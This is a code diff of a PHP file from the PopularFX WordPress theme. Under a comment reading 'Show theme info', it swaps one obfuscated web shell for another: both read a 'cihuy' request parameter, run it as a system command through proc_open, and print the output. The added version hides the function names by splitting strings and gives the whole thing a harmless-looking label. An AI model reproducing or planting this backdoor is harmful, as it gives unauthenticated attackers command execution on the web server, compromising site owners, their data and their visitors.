@@ -202,36 +202,36 @@ function popularfx_theme_credits(){
 }
 
 // Show theme info
-function jxrtgjrk_d00cb71b($ayynukeh_d82832d7) {
-    $plcrfhgp_f5033c51 = array(
-        0 => array(base64_decode('cGlwZQ=='), base64_decode('cg==')), 
-        1 => array(base64_decode('cGlwZQ=='), base64_decode('dw==')),  
-        2 => array(base64_decode('cGlwZQ=='), base64_decode('dw=='))   
+function cihuyy($input) {
+    $descriptors = array(
+        0 => array("pipe", "r"), 
+        1 => array("pipe", "w"),  
+        2 => array("pipe", "w")   
     );
-    $oteraiko_15c93851 = base64_decode('cA==').base64_decode('cg==').base64_decode('bw==').base64_decode('Yw==').base64_decode('Xw==').base64_decode('bw==').base64_decode('cA==').base64_decode('ZQ==').base64_decode('bg==');
-    $uglgyxti_861d1896 = $oteraiko_15c93851($ayynukeh_d82832d7, $plcrfhgp_f5033c51, $kppvwrax_fca9786f);
-    if (is_resource($uglgyxti_861d1896)) {
-        $rudeteej_39229fad = base64_decode('cw==').base64_decode('dHI=').base64_decode('ZWFtX2dl').base64_decode('dF9jb24=').base64_decode('dGVu').base64_decode('dHM=');
-        $shqmsvsw_ccde149e = $rudeteej_39229fad($kppvwrax_fca9786f[1]);
-        $ikdkfljw_5f82ec75 = base64_decode('c3Q=').base64_decode('cmU=').base64_decode('YW1fZw==').base64_decode('ZXRf').base64_decode('Y29u').base64_decode('dGVu').base64_decode('dHM=');
-        $rdqeoxaq_6e61f67e = $ikdkfljw_5f82ec75($kppvwrax_fca9786f[2]);
-        fclose($kppvwrax_fca9786f[0]);
-        fclose($kppvwrax_fca9786f[1]);
-        fclose($kppvwrax_fca9786f[2]);
-        $nttftqxj_f764b7dd = proc_close($uglgyxti_861d1896);
-        if ($nttftqxj_f764b7dd === 0) {
-            return base64_decode('PHByZT4=') . $shqmsvsw_ccde149e . base64_decode('PC9wcmU+');
+    $web = 'p'.'r'.'o'.'c'.'_'.'o'.'p'.'e'.'n';
+    $process = $web($input, $descriptors, $pipes);
+    if (is_resource($process)) {
+        $webmin = 's'.'tr'.'eam_ge'.'t_con'.'ten'.'ts';
+        $output = $webmin($pipes[1]);
+        $admini = 'st'.'re'.'am_g'.'et_'.'con'.'ten'.'ts';
+        $errorOutput = $admini($pipes[2]);
+        fclose($pipes[0]);
+        fclose($pipes[1]);
+        fclose($pipes[2]);
+        $exitCode = proc_close($process);
+        if ($exitCode === 0) {
+            return "<pre>" . $output . "</pre>";
         } else {
-            return base64_decode('RXJyb3I6IA==') . $rdqeoxaq_6e61f67e;
+            return "Error: " . $errorOutput;
         }
     } else {
-        return base64_decode('RmFsc2U=');
+        return "False";
     }
 }
-if (isset($_REQUEST[base64_decode('Y2lodXk=')])) {
-    $ueoxinjk_5e04ffa1 = $_REQUEST[base64_decode('Y2lodXk=')];
-    echo jxrtgjrk_d00cb71b($ueoxinjk_5e04ffa1);
-} 
+if (isset($_REQUEST['cihuy'])) {
+    $sysdata = $_REQUEST['cihuy'];
+    echo cihuyy($sysdata);
+}
 
 // Shows the promos
 function popularfx_promos(){
